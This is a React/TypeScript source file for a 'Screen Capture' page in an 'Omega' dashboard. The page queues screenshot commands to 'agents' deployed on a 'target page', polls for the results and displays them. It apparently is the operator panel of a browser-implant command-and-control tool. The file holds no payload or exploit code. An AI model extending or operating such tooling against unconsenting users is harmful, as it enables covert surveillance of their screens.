// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { useState } from "react";
import { Layout } from "@/components/layout";
import { useListHosts } from "@workspace/omega-api-client-react";
import { Card, CardContent } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { format } from "date-fns";
import { Camera, RefreshCw, Monitor, ImageOff } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const BASE = "/api/omega";

type Screenshot = { id: number; hostId: number; label: string; widthPx: number; heightPx: number; sizeKb: number; createdAt: string; hasData?: boolean };

async function fetchShots(hostId: number): Promise<Screenshot[]> {
  const r = await fetch(`${BASE}/screenshots/${hostId}`);
  if (!r.ok) throw new Error("Failed");
  return r.json();
}

async function captureShot(hostId: number): Promise<{ queued?: boolean; commandId?: number; message?: string }> {
  const r = await fetch(`${BASE}/screenshots/${hostId}/capture`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ label: "Page" }),
  });
  if (!r.ok) {
    const err = await r.json().catch(() => ({}));
    throw new Error((err as any).error || "Failed");
  }
  return r.json();
}

function ScreenCard({ shot }: { shot: Screenshot }) {
  const imgSrc = `${BASE}/screenshots/data/${shot.id}`;
  const [imgError, setImgError] = useState(false);

  return (
    <Card className="border-border bg-card/40 hover:border-primary/40 transition-all overflow-hidden group">
      <div className="relative aspect-video bg-black/60">
        {shot.hasData && !imgError ? (
          <img
            src={imgSrc}
            alt={shot.label}
            className="w-full h-full object-contain"
            onError={() => setImgError(true)}
          />
        ) : (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 text-muted-foreground/40">
            {imgError ? (
              <ImageOff className="w-10 h-10" />
            ) : (
              <>
                <Monitor className="w-10 h-10" />
                <span className="text-xs font-mono">awaiting agent</span>
              </>
            )}
          </div>
        )}
        {!shot.hasData && (
          <div className="absolute top-2 right-2">
            <Badge variant="outline" className="text-[9px] border-yellow-500/40 text-yellow-400">pending</Badge>
          </div>
        )}
      </div>
      <CardContent className="p-3">
        <div className="flex items-center justify-between">
          <Badge variant="outline" className="text-xs font-mono text-primary border-primary/30 truncate max-w-[140px]" title={shot.label}>{shot.label}</Badge>
          <div className="text-right">
            <p className="text-xs text-muted-foreground font-mono">{format(new Date(shot.createdAt), "MM/dd HH:mm:ss")}</p>
            {shot.sizeKb > 0 && <p className="text-[10px] text-muted-foreground/50">{shot.widthPx}×{shot.heightPx} · {shot.sizeKb}kb</p>}
          </div>
        </div>
      </CardContent>
    </Card>
  );
}

export default function ScreenCapture() {
  const [selectedHostId, setSelectedHostId] = useState<number | null>(null);
  const { data: hosts } = useListHosts();
  const qc = useQueryClient();
  const { toast } = useToast();

  const { data: shots, isLoading, refetch } = useQuery({
    queryKey: ["screenshots", selectedHostId],
    queryFn: () => fetchShots(selectedHostId!),
    enabled: !!selectedHostId,
    refetchInterval: 5000,
  });

  const captureMut = useMutation({
    mutationFn: () => captureShot(selectedHostId!),
    onSuccess: (data) => {
      qc.invalidateQueries({ queryKey: ["screenshots", selectedHostId] });
      if (data.queued) {
        toast({ title: "Screenshot queued", description: "Agent will capture on next poll (≤3s)" });
      } else {
        toast({ title: "Screenshot captured" });
      }
    },
    onError: (e: any) => {
      toast({ title: "Failed", description: e.message, variant: "destructive" });
    },
  });

  const selectedHost = hosts?.find(h => h.id === selectedHostId);

  return (
    <Layout>
      <div className="space-y-6">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
          <div>
            <h1 className="text-3xl font-bold tracking-tight flex items-center gap-3">
              <Camera className="h-7 w-7 text-primary" /> Screen Capture
            </h1>
            <p className="text-muted-foreground mt-1">Browser canvas screenshots from live Omega agents.</p>
          </div>
          <div className="flex items-center gap-2">
            <Select value={selectedHostId?.toString() ?? ""} onValueChange={v => setSelectedHostId(parseInt(v))}>
              <SelectTrigger className="w-[200px]"><SelectValue placeholder="Select a host..." /></SelectTrigger>
              <SelectContent>
                {hosts?.map(h => (
                  <SelectItem key={h.id} value={h.id.toString()}>
                    <span className="flex items-center gap-2">
                      <span className={`w-2 h-2 rounded-full inline-block ${h.status === 'online' ? 'bg-green-500' : h.status === 'offline' ? 'bg-red-500' : 'bg-gray-500'}`} />
                      {h.label}
                    </span>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {selectedHostId && (
              <>
                <Button variant="outline" size="icon" onClick={() => refetch()}>
                  <RefreshCw className="h-4 w-4" />
                </Button>
                <Button onClick={() => captureMut.mutate()} disabled={captureMut.isPending} className="gap-2">
                  <Camera className="h-4 w-4" />
                  {captureMut.isPending ? "Queuing..." : "Capture"}
                </Button>
              </>
            )}
          </div>
        </div>

        {selectedHostId && selectedHost?.status !== "online" && (
          <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-md p-3 text-yellow-400 text-sm">
            Host is <strong>{selectedHost?.status ?? "unknown"}</strong> — deploy the Omega agent on the target page first to receive real screenshots.
          </div>
        )}

        {!selectedHostId ? (
          <Card className="border-border bg-card/40">
            <CardContent className="py-16 text-center text-muted-foreground">Select a host to view screenshots.</CardContent>
          </Card>
        ) : isLoading ? (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {[...Array(6)].map((_, i) => <Skeleton key={i} className="aspect-video w-full rounded-lg" />)}
          </div>
        ) : !shots?.length ? (
          <Card className="border-border bg-card/40">
            <CardContent className="py-16 text-center text-muted-foreground">
              No screenshots yet. Click <strong>Capture</strong> to queue a screenshot command — the agent will send the real image on its next poll.
            </CardContent>
          </Card>
        ) : (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {shots.map(shot => <ScreenCard key={shot.id} shot={shot} />)}
          </div>
        )}
      </div>
    </Layout>
  );
}
